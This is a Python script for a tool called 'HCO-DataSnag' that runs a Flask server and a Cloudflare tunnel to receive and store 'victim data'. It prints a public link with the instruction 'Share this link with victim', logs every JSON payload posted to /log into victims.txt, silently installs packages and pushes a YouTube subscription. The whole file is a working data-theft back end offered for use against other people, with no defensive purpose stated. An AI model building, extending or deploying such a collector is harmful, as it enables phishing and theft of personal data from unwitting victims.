import os
import time
import subprocess
from flask import Flask, request
import json
import threading
import re

app = Flask(__name__)

DATA_FILE = "victims.txt"
YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"

# Create data file if not exist
if not os.path.exists(DATA_FILE):
    open(DATA_FILE, "w").close()

# Terminal banner
def banner():
    os.system("clear")
    print("\033[1;91m")
    print("╔══════════════════════════════╗")
    print("║     HCO-DataSnag by Azhar    ║")
    print("╚══════════════════════════════╝\033[0m")
    print("\n[•] Installing requirements...")
    os.system("pip install flask requests > /dev/null 2>&1")

# Redirect to YouTube before tool starts
def youtube_redirect():
    print("\n\033[1;93mRedirecting to YouTube in 8 seconds...\033[0m")
    time.sleep(8)
    os.system(f"am start -a android.intent.action.VIEW -d {YOUTUBE_URL}")
    input("\n\033[1;96mPress ENTER after subscribing to continue...\033[0m")

# Start Flask server
def start_flask():
    print("\n[•] Starting Flask server...")
    threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000}).start()
    time.sleep(2)

# Start Cloudflare and get URL
def start_cloudflared():
    print("[•] Starting Cloudflare tunnel...")
    subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=open("cf.log", "w"), stderr=subprocess.STDOUT)
    time.sleep(7)
    try:
        with open("cf.log", "r") as f:
            output = f.read()
        match = re.search(r"https://[a-zA-Z0-9.-]+\.trycloudflare\.com", output)
        if match:
            url = match.group(0)
            print(f"\n\033[1;92m[✓] Share this link with victim: {url}\033[0m")
        else:
            print("\n\033[1;91m[×] Failed to get Cloudflare URL. Make sure tunnel started properly.\033[0m")
    except Exception as e:
        print(f"\n[×] Error reading Cloudflare output: {e}")

# Flask route for victim data
@app.route('/log', methods=['POST'])
def log_data():
    try:
        data = request.get_json()
        with open(DATA_FILE, "a") as f:
            f.write(json.dumps(data, indent=2) + "\n\n")
        print("\n\033[1;92m[✓] New victim data captured:\033[0m")
        print(json.dumps(data, indent=2))
        return "Received", 200
    except Exception as e:
        return f"Error: {e}", 500

# Main
if __name__ == "__main__":
    banner()
    youtube_redirect()
    start_flask()
    start_cloudflared()
